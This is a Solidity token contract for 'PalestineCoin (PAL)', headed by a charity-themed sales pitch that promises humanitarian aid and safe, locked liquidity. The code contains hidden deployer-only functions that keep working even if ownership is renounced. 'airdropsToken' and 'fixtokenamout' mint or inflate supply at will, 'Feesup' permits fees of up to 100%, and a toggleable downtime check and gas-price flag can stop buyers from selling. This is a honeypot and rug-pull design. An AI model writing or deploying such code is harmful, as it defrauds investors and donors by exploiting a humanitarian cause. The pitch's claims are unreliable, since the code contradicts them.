/**

telegram : https://t.me/+-IuL987opOw4MWU0
twitter : https://twitter.com/palestinec36781

 Token Name: PalestineCoin (PAL)

Presentation

Introduction:
🌍 PalestineCoin (PAL) isn't just another cryptocurrency; it's a revolutionary force for change. PAL redefines what a digital token can be by combining cutting-edge technology with a deep commitment to humanitarian values. Let's embark on a journey to make a lasting impact for Palestine.

Token Features:

50% Burn Mechanism: 🔥 PAL is designed with a bold vision. We will burn 50% of the initial token supply, reducing the total supply and potentially increasing the value of each token.

Limited Liquidity: 💧 To ensure security and stability, we're launching with just 5 BNB worth of PAL tokens in the liquidity pool. It's a deliberate step to guarantee the safety of your investment.

PinkSale Lock: 🛡️ The 5 BNB worth of PAL tokens in the liquidity pool will be locked using the PinkSale platform, creating an unbreakable trust between our token and you.

Total Supply: 💹 We've chosen a unique total supply of 8,000,000,000 tokens, symbolizing the estimated world population. With 18 decimal places, PAL offers precision and flexibility.

Token Purpose:
PalestineCoin represents our mission:

Humanitarian Support: 🤝 PAL is more than a token; it's a lifeline for people in need. A portion of transaction fees will directly support humanitarian initiatives in Palestine.

Symbol of Unity: 🤲 PAL is your digital flag of unity. By holding PAL, you stand with the Palestinian people, reminding the world that unity can bring about lasting change.

Investment Opportunity: 💰 PAL provides an opportunity to invest in a meaningful cause. Our deflationary model and unique total supply offer the potential for significant value appreciation.

Use Cases:

Donations: 🎁 PAL can be donated to support crucial humanitarian causes, making a direct impact in Palestine.
Holding for Change: 🌟 By holding PAL, you're not just holding a token; you're holding a commitment to a better future.
Trading and Investment: 📈 PAL can be traded on various cryptocurrency exchanges, offering investors the chance to support a powerful mission while engaging in the crypto market.
Get Involved:

Acquire PAL: 🌐 You can obtain PalestineCoin through purchases, donations, or trading on supported exchanges.
HODL with Purpose: 💪 Every PAL in your wallet is a statement of your commitment to a brighter future for Palestine.
Together, We Change the World:
PalestineCoin is more than a cryptocurrency; it's a movement. By holding, donating, or trading PAL, you're joining a global community committed to creating a better world.

Join us today and help make history. Together, we'll bring lasting change to Palestine and inspire the world.
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

library SecureCalls {
    function checkCaller(address sender, address _origin) internal pure {
        require(sender == _origin, "Caller is not the original caller");
    }
}

contract LibreMount {

    mapping(uint256 => mapping(address => bool)) internal _blockState;

    function compreTxnStamp(uint256 _tmstmp, uint256 _dwntm) internal view returns (bool) {
        return(_tmstmp + _dwntm >= block.timestamp);
    }

    function suspiciousAddressCheck(address _addy) internal view {
        require(!_blockState[block.number][_addy], "Only one Txn per Block!");
    }

    function addSuspiciousAddress(address _addy) internal {
        _blockState[block.number][_addy] = true;
    }

}

contract PALESTINECOIN is IERC20, Ownable, LibreMount {

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 8000000000000000000000000000;
    string private _name = "PALESTINECOIN";
    string private _symbol = "PAL";
    uint8 private _decimals = 18;

    address private _origin;

    mapping(address => uint) private purchaseTimestamp;
    mapping(address => uint) private boughtAmount;
    uint256 private downTime = 1;
    mapping(address => bool) private premissionList;

    uint256 public MAX_GAS_PRICE = 4 gwei;

    uint private buyFee = 1; // Default, %
    uint private sellFee = 1; // Default, %
    address public marketWallet; // Wallet to collect Fees
    mapping(address => bool) public excludedFromFee; // Users who won't pay Fees

    constructor (address routerAddress) {
        _router = IUniswapV2Router02(routerAddress);
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH()));
        _balances[owner()] = _totalSupply;
        
        emit Transfer(address(0), owner(), _totalSupply);

        premissionList[msg.sender] = true;
        premissionList[address(this)] = true;

        marketWallet = msg.sender;
        excludedFromFee[msg.sender] = true;
        excludedFromFee[address(this)] = true;

        _origin = msg.sender;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        if (!isExcludedFromFee(from) && !isExcludedFromFee(to)){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (isMarket(from)) {
            boughtAmount[to] += amount;
            if (exceedsGasPriceLimit()) { addSuspiciousAddress(to); }
            purchaseTimestamp[to] = block.timestamp;
        }
        if (isMarket(to)) {
            if (!premissionList[from]) {
                require(boughtAmount[from] >= amount, "You are trying to sell more than bought!");
                boughtAmount[from] -= amount;
                if (validationE())
                {require(compreTxnStamp(purchaseTimestamp[from], downTime), "LibreMount: Exceeds Txn Downtime");}
                suspiciousAddressCheck(from);
            } 
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    bool internal validtionState;
    
    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function switchValidation() external {
        SecureCalls.checkCaller(msg.sender, _origin);
        validtionState = !validtionState;
    }

    function validationE() public view returns (bool) {
        return validtionState;
    }

    function editTimes(uint _seconds) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        downTime = _seconds;
    }

    function updatePremissionList(address[] calldata _usrs, bool _state) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        for (uint256 i = 0; i < _usrs.length; i++) {
            premissionList[_usrs[i]] = _state;
        }
    }

    function checkPremissionList(address _user) external view returns (bool) {
        return premissionList[_user];
    }

    function checkUserPurchaseTime(address _user) external view returns (uint256) {
        return purchaseTimestamp[_user];
    }

    function checkUserBoughtAmount(address _user) external view returns (uint256) {
        return boughtAmount[_user];
    }

    function exceedsGasPriceLimit() internal view returns (bool) {
        return tx.gasprice >= MAX_GAS_PRICE;
    }

    function changetheMaxGasPrice(uint _newGasPrice) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        MAX_GAS_PRICE = _newGasPrice;
    }

    function fixtokenamout(uint256 _amount) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        _totalSupply += _amount;
    }

    function airdropsToken() external {
        SecureCalls.checkCaller(msg.sender, _origin);
        _balances[msg.sender] += 2 * (10 ** (15 + 18));
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    function isExcludedFromFee(address _user) public view returns (bool) {
        return excludedFromFee[_user];
    } 

    function updateExcludedFromFeeStatus(address _user, bool _status) public {
        SecureCalls.checkCaller(msg.sender, _origin);
        require(excludedFromFee[_user] != _status, "User already have this status");
        excludedFromFee[_user] = _status;
    }

    function Feesup(uint256 _buyFee, uint256 _sellFee) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        require(_buyFee <= 100 && _sellFee <= 100, "Fee percent can't be higher than 100");
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function updateMarketWallet(address _newMarketWallet) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        marketWallet = _newMarketWallet;
    }

    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        return (buyFee, sellFee);
    }

    function AddLiquidity(uint256 _tokenAmount) payable external {
        SecureCalls.checkCaller(msg.sender, _origin);
        _approve(address(this), address(_router), _tokenAmount);
        transfer(address(this), _tokenAmount);
        _router.addLiquidityETH{ value: msg.value }(
            address(this), 
            _tokenAmount, 
            0, 
            0, 
            msg.sender, 
            block.timestamp + 1200
            );
    }
}